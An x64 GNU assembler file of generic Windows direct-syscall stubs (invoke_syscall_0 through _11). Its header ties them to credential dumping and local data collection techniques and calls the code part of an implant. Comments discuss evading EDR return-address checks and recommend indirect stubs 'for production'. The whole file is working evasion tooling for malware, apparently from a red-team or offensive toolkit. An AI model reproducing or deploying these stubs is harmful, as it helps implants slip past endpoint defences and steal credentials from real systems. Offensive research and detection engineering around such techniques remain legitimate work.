# syscalls_asm.s — BM-T1003/T1005: Direct Syscall Stubs (Generic)
# GAS (GNU Assembler) x64 — Intel syntax
#
# Generic stubs that take the SSN as the first C argument.
# All NT function args are shifted right by one position.
#
# invoke_syscall_N(DWORD ssn, arg1, arg2, ..., argN)
#
# C calling convention (Windows x64):
#   RCX=ssn, RDX=arg1, R8=arg2, R9=arg3, [RSP+0x28]=arg4, ...
#
# Syscall convention (NT):
#   EAX=ssn, R10=arg1, RDX=arg2, R8=arg3, R9=arg4, [RSP+0x28]=arg5, ...
#
# The stub shifts: ECX→EAX, RDX→R10, R8→RDX, R9→R8, stack→R9,
# then compacts remaining stack args down by one slot.
#
# Supports 0-11 arguments (covers all known NT syscalls including
# NtCreateThreadEx at 11 args and NtMapViewOfSection at 10).
#
# OPSEC WARNING: Direct stubs execute `syscall` from implant memory.
#   EDR return-address validation WILL flag this. Use indirect stubs
#   (indirect_syscalls_asm.s) for production.

.intel_syntax noprefix

.text

# invoke_syscall_0(DWORD ssn)
.globl invoke_syscall_0
invoke_syscall_0:
    mov eax, ecx
    syscall
    ret

# invoke_syscall_1(DWORD ssn, void *arg1)
.globl invoke_syscall_1
invoke_syscall_1:
    mov eax, ecx
    mov r10, rdx
    syscall
    ret

# invoke_syscall_2(DWORD ssn, void *arg1, void *arg2)
.globl invoke_syscall_2
invoke_syscall_2:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    syscall
    ret

# invoke_syscall_3(DWORD ssn, void *arg1, void *arg2, void *arg3)
.globl invoke_syscall_3
invoke_syscall_3:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    syscall
    ret

# invoke_syscall_4(DWORD ssn, void *a1, ..., void *a4)
.globl invoke_syscall_4
invoke_syscall_4:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    syscall
    ret

# invoke_syscall_5(DWORD ssn, void *a1, ..., void *a5)
# Shift 1 stack arg down
.globl invoke_syscall_5
invoke_syscall_5:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    syscall
    ret

# invoke_syscall_6(DWORD ssn, void *a1, ..., void *a6)
# Shift 2 stack args down
.globl invoke_syscall_6
invoke_syscall_6:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    syscall
    ret

# invoke_syscall_7(DWORD ssn, void *a1, ..., void *a7)
# Shift 3 stack args down
.globl invoke_syscall_7
invoke_syscall_7:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    syscall
    ret

# invoke_syscall_8(DWORD ssn, void *a1, ..., void *a8)
# Shift 4 stack args down
.globl invoke_syscall_8
invoke_syscall_8:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    mov r11, qword ptr [rsp + 0x48]
    mov qword ptr [rsp + 0x40], r11
    syscall
    ret

# invoke_syscall_9(DWORD ssn, void *a1, ..., void *a9)
# Shift 5 stack args down
.globl invoke_syscall_9
invoke_syscall_9:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    mov r11, qword ptr [rsp + 0x48]
    mov qword ptr [rsp + 0x40], r11
    mov r11, qword ptr [rsp + 0x50]
    mov qword ptr [rsp + 0x48], r11
    syscall
    ret

# invoke_syscall_10(DWORD ssn, void *a1, ..., void *a10)
# Shift 6 stack args down
.globl invoke_syscall_10
invoke_syscall_10:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    mov r11, qword ptr [rsp + 0x48]
    mov qword ptr [rsp + 0x40], r11
    mov r11, qword ptr [rsp + 0x50]
    mov qword ptr [rsp + 0x48], r11
    mov r11, qword ptr [rsp + 0x58]
    mov qword ptr [rsp + 0x50], r11
    syscall
    ret

# invoke_syscall_11(DWORD ssn, void *a1, ..., void *a11)
# Shift 7 stack args down
.globl invoke_syscall_11
invoke_syscall_11:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    mov r11, qword ptr [rsp + 0x48]
    mov qword ptr [rsp + 0x40], r11
    mov r11, qword ptr [rsp + 0x50]
    mov qword ptr [rsp + 0x48], r11
    mov r11, qword ptr [rsp + 0x58]
    mov qword ptr [rsp + 0x50], r11
    mov r11, qword ptr [rsp + 0x60]
    mov qword ptr [rsp + 0x58], r11
    syscall
    ret
